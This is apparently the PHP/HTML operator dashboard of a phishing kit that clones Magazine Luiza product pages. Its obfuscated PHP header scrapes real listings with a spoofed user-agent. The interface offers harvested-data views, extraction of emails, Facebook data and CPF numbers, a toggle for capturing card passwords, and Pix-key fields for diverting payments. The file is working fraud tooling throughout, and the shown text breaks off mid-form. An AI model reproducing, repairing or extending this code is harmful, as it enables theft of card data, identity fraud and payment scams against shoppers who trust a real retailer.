<?php eval(base64_decode('
 goto GfO7p; oxxvz: session_start(); goto HKBTs; otnug: while ($consultaVX = $conVX->fetch_array()) { $tokken = $consultaVX["\164\x6f\153\153\x65\156"]; } goto v28Gf; bhoyu: ini_set(display_errors, 0); goto oxxvz; v28Gf: $host_api = $_SESSION["\150\157\x73\164\137\141\x70\x69"]; goto m6NXf; v4tbE: require_once "\146\x75\x6e\143\164\151\x6f\x6e\x2f\x63\157\156\145\x78\141\157\x2e\x70\150\160"; goto tMeAK; M1Ajn: if (isset($_SESSION["\x6c\x6f\147\x69\156\137\165\x73\145\x72"]) and $a == 1) { if (isset($_POST["\x73\145\164\x5f\154\151\x6e\x6b"])) { $URL_A = $_POST["\x75\x72\x6c"]; $URL_B = addslashes($URL_A); $URL = str_replace("\155\x2e\x6d\x61\x67\x61\x7a\x69\156\x65\154\x75\151\172\141\x2e\143\x6f\155\56\142\x72", "\167\x77\x77\56\155\x61\147\x61\x7a\151\x6e\145\x6c\165\x69\172\x61\x2e\x63\157\x6d\x2e\142\162", $URL_B); $options_5 = array("\150\x74\x74\160" => array("\155\x65\x74\x68\157\x64" => "\107\x45\124", "\150\145\141\144\x65\x72" => "\101\x63\143\145\x70\x74\x2d\154\141\x6e\147\165\141\147\145\72\x20\145\x6e\xd\12" . "\x43\x6f\x6f\153\151\x65\x3a\40\x66\157\x6f\75\x62\x61\x72\xd\12" . "\125\163\x65\162\55\101\x67\x65\156\x74\72\40\x4d\157\172\151\x6c\154\x61\x2f\65\56\x30\40\50\130\x31\x31\x3b\40\114\151\x6e\165\170\x20\170\x38\x36\x5f\66\x34\51\40\x41\160\x70\154\x65\127\145\142\113\151\164\57\x35\x33\x37\56\63\x36\x20\50\x4b\110\x54\x4d\x4c\54\40\154\151\153\145\40\x47\145\x63\153\x6f\x29\40\103\x68\x72\157\155\x65\x2f\x35\x31\56\60\56\x32\x37\x30\64\x2e\61\x30\63\x20\123\x61\146\141\162\151\57\x35\x33\67\56\63\x36")); $context_5 = stream_context_create($options_5); $dadosSite = file_get_contents($URL, false, $context_5); $explode_3 = explode("\42\x66\x75\154\x6c\124\x69\164\154\x65\42\72\40\x22", $dadosSite); $explode_nome = explode("\42", $explode_3[1]); $explode_4 = explode("\42\x62\x65\x73\164\120\162\151\x63\x65\124\x65\x6d\160\154\141\164\145\42\x3a\x20\42\40", $dadosSite); $explode_preco = explode("\42", $explode_4[1]); $explode_5 = explode("\x3c\154\x61\142\x65\154\x20\x63\154\x61\163\x73\75\42\151\156\x66\157\162\x6d\x61\x74\151\x6f\156\55\166\x61\x6c\165\145\163\x5f\137\x76\141\162\151\141\x74\151\157\156\x2d\154\x61\x62\145\154\x22\40\146\157\x72\75\x22\x76\141\x72\151\141\164\x69\157\x6e\55\154\141\142\x65\x6c\42\x3e", $dadosSite); $explode_voltagem = explode("\x3c\57\x6c\141\142\x65\154\76", $explode_5[1]); function generateRandomString($size = 7) { $chars = "\101\x42\x43\104\x45\x46\x47\110\x49\x4a\113\x4c\x4d\x4e\x4f\x50\x51\x52\123\x54\125\x56\x57\x58\x59\132\141\142\143\144\145\146\147\x68\151\152\x6b\154\x6d\156\157\160\x71\x72\x73\164\x75\167\170\171\x7a\x30\61\62\x33\64\x35\x36\67\x38\x39"; $randomString = ''; for ($i = 0; $i < $size; $i = $i + 1) { $randomString .= $chars[mt_rand(0, 60)]; } return $randomString; } $explode_6 = explode("\42\x73\x6b\165\42\x3a\x20\42", $dadosSite); $explode_sku = explode("\42", $explode_6[1]); if (empty($explode_sku[0])) { $SKU = generateRandomString(10); } else { $SKU = $explode_sku[0]; } $explode_1 = explode("\x3c\151\155\x67\x20\x63\154\x61\x73\x73\x3d\x22\x63\x61\x72\x6f\x75\163\x65\x6c\55\160\x72\x6f\x64\x75\143\x74\137\137\x69\x74\x65\x6d\55\x69\x6d\147\40\x6a\x73\x2d\x63\x61\162\157\165\x73\145\154\x73\x2d\155\x61\151\x6e\55\x69\164\x65\x6d\55\151\x6d\147\x20\x6c\x61\x7a\171\154\157\x61\x64\x22\x20\x73\x72\143\x3d\42", $dadosSite); $explode_img_1 = explode("\42", $explode_1[1]); $explode_img_2 = explode("\x22", $explode_1[2]); $explode_img_3 = explode("\x22", $explode_1[3]); $explode_img_4 = explode("\x22", $explode_1[4]); $explode_img_5 = explode("\42", $explode_1[5]); $explode_img_6 = explode("\42", $explode_1[6]); $explode_img_7 = explode("\42", $explode_1[7]); $explode_img_8 = explode("\x22", $explode_1[8]); $explode_img_9 = explode("\x22", $explode_1[9]); } $tempo_restante = tempo_restante($expira_tokken[0])[1]; if (tempo_restante($expira_tokken[0])[0] == 2) { header("\x6c\157\x63\x61\x74\x69\157\x6e\x3a\x20\154\x6f\x67\151\x6e\x2e\x70\x68\x70\77\145\170\160\x69\162\x6f\165"); unset($_SESSION["\x6c\x6f\147\x69\156"], $_SESSION["\x73\164\x61\x72\x74"], $_SESSION["\165\160"]); } ?>







<!DOCTYPE html>
<html lang="en">
  
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Magalu - ZK</title>
    
    <!-- CSS -->
    <link href="assets/css/fonts/fontawesome/all.min.css" rel="stylesheet">
    <link href="assets/css/fonts/beid.css" rel="stylesheet">
    
    <link href="assets/css/main.css" rel="stylesheet">
    <link href="assets/css/styles.css" rel="stylesheet">

    <!-- JQVMAP -->
    <link href="assets/plugins/jqvmap/jqvmap.min.css" rel="stylesheet">

    <!-- dateRangePicker -->
    <link href="assets/plugins/daterangepicker/daterangepicker.css" rel="stylesheet">

    <!-- Favicons -->
    <link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
    <link rel="icon" href="assets/img/favicon.png">

    <!-- Fonts -->
    <link href="assets/fonts/inter/inter.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
    <style>
  
  .main-sidebar {
  background: #020022 url(<?php  echo $link_img; ?>
) no-repeat center center/cover;
  border-right: 1px solid rgba(42, 242, 112, 0.2);
  z-index: 1001;
  overflow-y: hidden; }
  .main-sidebar .main-sidebar-inner {
    max-height: 100vh; }
    .main-sidebar .main-sidebar-inner ~ .nicescroll-rails {
      border-radius: 0 !important; }
  
  
  
  </style>
   <body id="theme -dark" class="body">
  	  <?php  if ($status_tokken[0] == 1) { ?>

  		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
		
		<script>
		//Executar a cada 10 segundos, para atualizar a qunatidade de usuários online
		setInterval(function(){
			//Incluir e enviar o POST para o arquivo responsável em fazer contagem
			$.post("function/processa_vis.php", {contar: '',}, function(data){
				$('#online').text(data);
			});
		}, 10000);
		</script>
		
		

		
		
		
		

    <!-- header -->
    <header class="main-header">
      <!-- nav -->
      <nav class="main-navbar navbar navbar-expand-lg navbar-light shadow-2">
        <div class="lnav-box d-flex">
          <div class="logo-wrapper px-3 d-none d-md-flex">
            <img src="assets/img/logo.png" alt="Logo">
          </div>
          <div class="sidebar-toggler-wrapper ml-auto">
            <button class="p-collapsing-sidebar-toggler sidebar-toggler-secondary transition rounded-circle" data-collapsing="partially" data-collapsing-target="#adminNav" type="button">
              <span class="icon-menu-options"></span>
            </button>
          </div>
        </div>
        <div class="d-none d-lg-block ml-0 mr-auto pl-4">

        </div>
        <div class="pr-6">
          <ul class="nav sec-nav navbar-nav flex-row">

       
<!-- 
			
						
            <li class="notf-item nav-item p-static p-md-relative dropdown">
              <a class="notf-link nav-link d-inline-flex align-items-center h-100 small-1 pl-2 pl-md-3" href="#" id="dropdownCart" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <span class="p-relative d-inline-flex">
                  <span class="badge badge-counter badge-warning l-1">7</span><i class="fas fa-credit-card"></i>
                </span>
              </a>
              <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right dropdown-menu-sm-center dropdown-menu-wh shadow-1 bc-t position-absolute mt-1" aria-labelledby="dropdownCart">
                <div class="dropdown-inner rounded-2">
                  <div class="warning-gradient px-4 py-3 text-center">
                    <h5 class="mb-0">Infos Recentes</h5>
                  </div>
                  <div class="pl-4 pr-3 py-5">
                    <div class="dropdown-scrollbar" data-scrollbar="dropdown">
                      <ul class="cart_list_hr list-unstyled">
                       


					   <li class="cart_list_item_hr">
                          <div class="d-flex align-items-center text-white">
                            <div class="text-warning cart-img lead-2">
                              <img src="assets/img/eCommerce/eCe-01.jpg" class="" alt="Smart Watch">
                            </div>
                            <div class="flex-1 px-4">
                              <div class="d-flex align-items-center">
                                <div class="pr-4">
                                  <span class="text-warning lead-1 lh-2 fw-600 d-block">Nome</span>
                                  <div class="cart-nav-desc">Learn small ways to make a big difference to.</div>
                                </div>
                                <div class="px-3 ml-auto">
                                  <a href="#" class="text-nowrap text-warning"><i class="fas fa-eye"></i></a>
                                </div>
                              </div>
                              <div class="d-flex">
                              </div>
                            </div>
                          </div>
                        </li>
   
      
       
                      </ul>
                    </div>
                  </div>
                  <div class="dropdown-load-more text-center px-4 py-2">
                    <a href="#"><i class="fas fa-eye"></i> Ver todos</a>
                  </div>
                </div>
              </div>
            </li>
 
			
			
			
            <li class="notf-item nav-item p-static p-md-relative dropdown">
              <a class="notf-link nav-link d-inline-flex align-items-center h-100 small-1 pl-2 pl-md-3" href="#" id="dropdownCart" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <span class="p-relative d-inline-flex">
                  <span class="badge badge-counter badge-warning l-1">7</span><i class="fas fa-file-invoice-dollar"></i>
                </span>
              </a>
              <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right dropdown-menu-sm-center dropdown-menu-wh shadow-1 bc-t position-absolute mt-1" aria-labelledby="dropdownCart">
                <div class="dropdown-inner rounded-2">
                  <div class="warning-gradient px-4 py-3 text-center">
                    <h5 class="mb-0">Boletos Recentes</h5>
                  </div>
                  <div class="pl-4 pr-3 py-5">
                    <div class="dropdown-scrollbar" data-scrollbar="dropdown">
                      <ul class="cart_list_hr list-unstyled">
                       


					   <li class="cart_list_item_hr">
                          <div class="d-flex align-items-center text-white">
                            <div class="text-warning cart-img lead-2">
                              <img src="assets/img/eCommerce/eCe-01.jpg" class="" alt="Smart Watch">
                            </div>
                            <div class="flex-1 px-4">
                              <div class="d-flex align-items-center">
                                <div class="pr-4">
                                  <span class="text-warning lead-1 lh-2 fw-600 d-block">Adriano Lima</span>
                                  <div class="cart-nav-desc">Learn small ways to make a big difference to.</div>
                                </div>
                                <div class="px-3 ml-auto">
                                  <a href="#" class="text-nowrap text-warning"><i class="fas fa-eye"></i></a>
                                </div>
                              </div>
                              <div class="d-flex">
                              </div>
                            </div>
                          </div>
                        </li>
   
      
       
                      </ul>
                    </div>
                  </div>
                  <div class="dropdown-load-more text-center px-4 py-2">
                    <a href="#"><i class="fas fa-eye"></i> Ver todos</a>
                  </div>
                </div>
              </div>
            </li>
 
  -->
 
 
            <li class="user-item nav-item dropdown">
              <a class="user-link nav-link d-inline-flex align-items-center h-100 small-1 pl-1 pl-sm-3 pr-0" href="#" id="dropdownAdmin_02" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="user-avatar rounded-circle mr-sm-3" src="assets/img/avatar/1.jpg" alt="Avatar">
                <div class="d-none d-sm-block lh-1">
                  <div class="lh-5"><?php  echo $_SESSION["\156\x6f\155\x65\137\x61"]; ?>
</div>
                  <span class="small-3"><i class="fas fa-circle text-warning small-5"></i> Online</span>
                </div>
              </a>
              <div class="dropdown-menu dropdown-menu-right shadow-1 py-3 position-absolute mt-2" aria-labelledby="dropdownAdmin">
                <a class="dropdown-item" href="deslogar.php"><span class="icon-power-on-buton mr-2"></span>Logout</a>
              </div>
            </li>
          </ul>
        </div>
      </nav>
      <!-- /.nav -->
    </header>
    <!-- /.header -->

    <!-- main -->
    <main>

      <nav id="adminNav" class="main-sidebar p-collapsing-sidebar sidebar-fixed sidebar-left d-flex flex-column">
        <div class="main-sidebar-inner" data-scrollbar="sidebar">
          <ul class="sidebar-nav sidebar-nav-light-hover list-unstyled text-unset small-3 fw-600 content-list">
           


		   <li class="nav-item text-light transition active">
              <a href="#" aria-expanded="false" data-toggle="collapse" class="sbr-collapse nav-link nav-link-border collapsed collapser collapser-active">
                <i class="fas fa-home"></i> <span class="p-collapsing-title">Inicio</span>
              </a>
              <div class="collapse nav-collapse collapse show">
                <ul class="list-unstyled">
                  <li class="nav-item active">
                    <a href="index.php" class="p-collapsing-title nav-link">
                      <span>Inicio</span>
                    </a>
                  </li>
                  <li class="nav-item">
                    <a href="produtos.php" class="p-collapsing-title nav-link">
                      <span>Produtos</span>
                    </a>
                  </li>
				  
		
           
                </ul>
              </div>
            </li>
			
					   <li class="nav-item text-light transition">
              <a href="#" aria-expanded="false" data-toggle="collapse" class="sbr-collapse nav-link nav-link-border collapsed collapser collapser">
                <i class="fas fa-credit-card"></i> <span class="p-collapsing-title">Infos</span>
              </a>
              <div class="collapse nav-collapse collapse">
                <ul class="list-unstyled">
                  <li class="nav-item">
                    <a href="infos.php?acao=1" class="p-collapsing-title nav-link">
                      <span>Infos colhidas</span>
                    </a>
                  </li>
                  <li class="nav-item">
                    <a href="infos.php?acao=2" class="p-collapsing-title nav-link">
                      <span>Boletos gerados</span>
                    </a>
                  </li>
                  <li class="nav-item">
                    <a href="infos.php?acao=3" class="p-collapsing-title nav-link">
                      <span>Extrair Email-s</span>
                    </a>
                  </li>
				  
				  <li class="nav-item">
                    <a href="infos.php?acao=4" class="p-collapsing-title nav-link">
                      <span>Extrair Facebook</span>
                    </a>
                  </li>
				  
				  <li class="nav-item">
                    <a href="infos.php?acao=5" class="p-collapsing-title nav-link">
                      <span>Extrair CPF</span>
                    </a>
                  </li>
				  
			
				  
                </ul>
              </div>
            </li>
			
						
					   <li class="nav-item text-light transition">
              <a href="#" aria-expanded="false" data-toggle="collapse" class="sbr-collapse nav-link nav-link-border collapsed collapser collapser">
                <i class="fas fa-cog"></i> <span class="p-collapsing-title">Configuração</span>
              </a>
              <div class="collapse nav-collapse collapse">
                <ul class="list-unstyled">
                  <li class="nav-item">
                    <a href="configuracao.php?acao=1" class="p-collapsing-title nav-link">
                      <span>Config Geral</span>
                    </a>
                  </li>
                  <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>Mensagens (Em breve)</span>
                    </a>
                  </li>
                  <li class="nav-item">
                    <a href="configuracao.php?acao=3" class="p-collapsing-title nav-link">
                      <span>Usuarios</span>
                    </a>
                  </li>
				  
				  <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>Engenharia (Em breve)</span>
                    </a>
                  </li>
				  
				  <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>Cupoms (Em breve)</span>
                    </a>
                  </li>
				  
				   <li class="nav-item">
                    <a href="configuracao.php?acao=5" class="p-collapsing-title nav-link">
                      <span>API WhatsApp</span>
                    </a>
                  </li>
				  
				  			  <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>SMTP (Em breve)</span>
                    </a>
                  </li>
				  

				  
			
				  
                </ul>
              </div>
            </li>

									
					   <li class="nav-item text-light transition">
              <a href="#" aria-expanded="false" data-toggle="collapse" class="sbr-collapse nav-link nav-link-border collapsed collapser collapser">
                <i class="fas fa-chart-bar"></i> <span class="p-collapsing-title">Análises</span>
              </a>
              <div class="collapse nav-collapse collapse">
                <ul class="list-unstyled">
                  <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>Logs (Em breve)</span>
                    </a>
                  </li>
                     <li class="nav-item">
                    <a href="#" class="p-collapsing-title nav-link">
                      <span>Estatísticas (Em breve)</span>
                    </a>
                  </li>
				  
                  <li class="nav-item">
                    <a href="analise.php?acao=3" class="p-collapsing-title nav-link">
                      <span>Ataques bloqueados</span>
                    </a>
                  </li>
				  
			
	
				  
	
				  

				  
			
				  
                </ul>
              </div>
            </li>

			<br><br>
			<center> 
			
			<a href="deslogar.php">
			<button class="p-collapsing-sidebar-toggler sidebar-toggler-secondary transition rounded-circle">
              <i class="fas fa-power-off"></i>
            </button>
			</a>
			</center>


          </ul>
        </div>
      </nav>






      <!-- main content -->
      <div class="main-container">

        <div class="overflow-hidden">

          <div id="dashboard">

            <!-- content-header -->
            <div class="row flex-wrap align-items-center px-6 py-5">
              <div class="col">
                <div class="text-light pb-5 pb-lg-0 mr-auto">
                  <h2 class="fw-100 mb-0">ZK - Magazine V <?php  echo $_SESSION["\166\x65\x72\163\x61\157\137\163\145\162\166\145\162"]; ?>
</h2>
                  <p class="mb-0">Expira em : <?php  echo $tempo_restante; ?>
</p>
                </div>
              </div>
              <div class="col-12 col-lg-auto">
                <div class="d-flex flex-wrap">
                  <div class="w-100 w-sm-auto reportrange-btn d-flex align-items-center warning-gradient rounded-4 c-pointer">
                    <div class="d-flex align-items-center justify-content-center w-100">
                      <div  class="py-2 px-6">
                        <span><?php  echo $data_index; ?>
</span>&nbsp;
                        <i class="fas fa-calendar-alt"></i>
                      </div>
                    </div>
                  </div>
               
                </div>
              </div>
            </div>
            <!-- /.content-header -->


			<!-- INICIO -->
			
			
			<?php  if (isset($_POST["\x73\x65\x74\x5f\x6c\151\x6e\153"])) { ?>
			<form method="post" action="function/add_produto.php" >

          <div id="product-details" class="product-details page-content-fl">
            <div class="text-light px-4 py-4">
              <h4 class="mb-0">Detalhes do produto</h4>
            </div>

            <div class="container-fluid p-0">
              <div class="row panel-top-line">
                <div class="col-12">
                  <div class="row">
                    <div class="col-xl-4 panel-right-line">
                      <div class="col-xr-space">
                        <div id="carouselExampleIndicators" class="carousel slide carousel-fade" data-ride="carousel">
                          <ol class="product-details-indicators carousel-indicators">
                            
							
							
							
							      <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"><img class="product-details-carouse-img" src="<?php  echo $explode_img_1[0]; ?>
" alt=""> </li>
	  
	  <?php  if (empty($explode_img_2[0])) { ?>
	  <li data-target="#carouselExampleIndicators" data-slide-to="1" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_1[0]; ?>
" alt="">  </li>
	  <?php  } else { ?>
	  <li data-target="#carouselExampleIndicators" data-slide-to="2" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_2[0]; ?>
" alt="">  </li>
	  <?php  } ?>
	 
	  <?php  if (empty($explode_img_3[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="3" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_3[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_4[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="4" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_4[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_5[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="5" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_5[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_6[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="6" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_6[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_7[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="7" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_7[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_8[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="8" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_8[0]; ?>
" alt="">  </li><?php  } ?>
	  <?php  if (empty($explode_img_9[0])) { } else { ?>
 	<li data-target="#carouselExampleIndicators" data-slide-to="9" ><img  class="product-details-carouse-img" src="<?php  echo $explode_img_9[0]; ?>
" alt="">  </li><?php  } ?>
							

 
						 </ol>
                          <div class="carousel-inner">
	
	<div class="carousel-item active"><img class="rounded" src="<?php  echo $explode_img_1[0]; ?>
" alt=""> </div>
			  
						  
	  <?php  if (empty($explode_img_2[0])) { ?>
	  	<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_1[0]; ?>
" alt=""> </div>
	  <?php  } else { ?>
	  <div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_1[0]; ?>
" alt=""> </div>
	  <?php  } ?>
	 
	  <?php  if (empty($explode_img_3[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_3[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_4[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_4[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_5[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_5[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_6[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_6[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_7[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_7[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_8[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_8[0]; ?>
" alt=""></div><?php  } ?>
	  <?php  if (empty($explode_img_9[0])) { } else { ?>
<div class="carousel-item"><img class="rounded" src="<?php  echo $explode_img_9[0]; ?>
" alt=""></div><?php  } ?>
						  


						 </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xl-8 pl-xl  -0">
                      <div class="p-4">
              
                        <div>
						             

									 <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-shopping-cart"></i></span>
                                    </div>
                                    <input required name="nome_produto" value="<?php  echo $explode_nome[0]; ?>
" placeholder="Insira um nome" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text"><i class="fas fa-dollar-sign"></i></span>
                                    </div>
                                  </div>
						  
						
                        </div>
                        <div>
						
						
						
						
                        </div>
              
			  
			  
<br>
							Ultilize somente números e ponto, exemplo: para ficar R$ 100,00 use somente 100, para fazer R$ 99,99 use 99.99

							

							
							
                               <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-shopping-cart"></i></span>
                                    </div>
                                    <input required name="preco" placeholder="Insira um preço EX: 50,00" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text"><i class="fas fa-dollar-sign"></i></span>
                                    </div>
                                  </div>
								<br><br>
                               
							   
							   <?php  if ($nivel_tokken[0] == 2) { ?>
							   <div>
                                  <span class="small d-block">Boleto</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input value="1" name="leto_status" type="checkbox" class="custom-switch-input" id="leto">
                                    <label class="custom-switch-label" for="leto"></label>
                                  </div>
								  
								  
                                </div>
							   <?php  } else { ?>
								
								<input type="hidden" value="2" name="leto_status">
 					   
							   <?php  } ?>
								
								<div>
                                  <span class="small d-block">Senha CC</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input value="1" name="senha_status" type="checkbox" class="custom-switch-input" id="senha">
                                    <label class="custom-switch-label" for="senha"></label>
                                  </div>
                                </div>
								
								
								<div>
                                  <span class="small d-block">Colher Repetidas</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input value="1" name="repetidas" type="checkbox" class="custom-switch-input" id="repetidas">
                                    <label class="custom-switch-label" for="repetidas"></label>
                                  </div>
                                </div>
								
								
								<?php  if ($explode_voltagem[0] == "\126\157\x6c\164\x61\147\x65\x6d\x3a") { ?>
								<div>
                                  <span class="small d-block">Voltagem</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input  checked value="1" name="voltagem" type="checkbox" class="custom-switch-input" id="voltagem">
                                    <label class="custom-switch-label" for="voltagem"></label>
                                  </div>
                                </div>
								<?php  } else { ?>
															
								<div>
                                  <span class="small d-block">Voltagem</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input value="2" name="voltagem" type="checkbox" class="custom-switch-input" id="voltagem">
                                    <label class="custom-switch-label" for="voltagem"></label>
                                  </div>
                                </div>
								<?php  } ?>
								
								
								<div>
                                  <span class="small d-block">Pix</span>
                                  <div class="custom-switch d-inline-block mb-3">
                                    <input onClick="verificarCheckBox()" value="1" name="pix" type="checkbox" class="custom-switch-input" id="pix">
                                    <label class="custom-switch-label" for="pix"></label>
                                  </div>
                                </div>
										
								<div id="chaves_pix">		
						
								  </div>
								
								
								<br>
								
								
								<script>
								
								
								function verificarCheckBox() {
    var check = document.getElementsByName("pix"); 

    for (var i=0;i<check.length;i++){ 
        if (check[i].checked == true){ 
		
            var chaves = document.getElementById ("chaves_pix")
			chaves.innerHTML = '<small>Adicione quantas chaves pix quiser, cole uma embaixo da outra, sem deixar linhas em branco nem espaços. </small><div class="input-group"><div class="input-group-prepend"><span class="input-group-text"><i class="fas fa-key"></i></span></div><textarea  required value="" name="chaves"  type="text" class="form-control"></textarea></div></div>';



        }  else {
            var chaves = document.getElementById ("chaves_pix")
			chaves.innerHTML = '';


        }
    }
}
								
								
								</script>
				
								
								
								
								
							<div id="accordion-1" class="accordion">

							 <div class="card">
                              <div class="card-header">
                                <h5 class="mb-0">
                                  <a data-toggle="collapse" href="#collapse-1-1">
                                    <span class="icon"><span class="icon-down-chevron"></span></span>
                                   Gerenciar Imagens
                                  </a>
                                </h5>
                              </div>
            
                              <div id="collapse-1-1" class="collapse" data-parent="#accordion-1">
							  
									<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input required value="<?php  echo $explode_img_1[0]; ?>
" name="img1" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">1</span>
                                    </div>
                                  </div>
								  
								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_2[0])) { } else { echo $explode_img_2[0]; } ?>
" name="img2" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">2</span>
                                    </div>
                                  </div>
								
																<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_3[0])) { } else { echo $explode_img_3[0]; } ?>
" name="img3" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">3</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_4[0])) { } else { echo $explode_img_4[0]; } ?>
" name="img4" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">4</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_5[0])) { } else { echo $explode_img_5[0]; } ?>
" name="img5" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">5</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_6[0])) { } else { echo $explode_img_6[0]; } ?>
" name="img6" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">6</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_7[0])) { } else { echo $explode_img_7[0]; } ?>
" name="img7" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">7</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_8[0])) { } else { echo $explode_img_8[0]; } ?>
" name="img8" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">8</span>
                                    </div>
                                  </div>
								  
								  								<br>
                                  <div class="input-group">
							   
                                    <div class="input-group-prepend">
                                      <span class="input-group-text"><i class="fas fa-images"></i></span>
                                    </div>
                                    <input  value="<?php  if (empty($explode_img_9[0])) { } else { echo $explode_img_9[0]; } ?>
" name="img9" placeholder="Link da imgem" type="text" class="form-control">
                                    <div class="input-group-append">
                                      <span class="input-group-text">9</span>
                                    </div>
                                  </div>
								
	
							  
							  
							  
							  </div>
                            </div>
                            </div>
								
								<br><br>
								
								
